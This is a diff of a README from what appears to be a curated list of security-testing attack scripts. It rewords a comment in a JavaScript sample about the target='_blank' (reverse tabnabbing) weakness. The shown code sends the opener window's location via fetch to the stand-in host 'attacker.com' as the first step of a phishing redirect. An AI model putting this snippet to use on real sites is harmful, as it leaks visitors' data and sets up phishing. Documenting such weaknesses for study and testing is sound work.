@@ -5,8 +5,9 @@ A curated list of script and attack for security testing purposes and knowledgem
   - #### `target="_blank"` vulnerability:
     ```javascript
     if (window.opener) {
-      // If this site was opened clicking to an `a` element which has setted the target to '_blank',
-      // the browser will initialize the `opener` object refered to the browser opener window.
+      // If the site that load this script was opened clicking to an `a` element 
+      // which has setted the target to '_blank', the browser will initialize the `opener` object
+      // refered to the browser opener window.
       // This weakness could be used to redirect the opener window to the phishing site.
     
       fetch("//attacker.com/log/start/phishing/?location=" + window.opener.location)
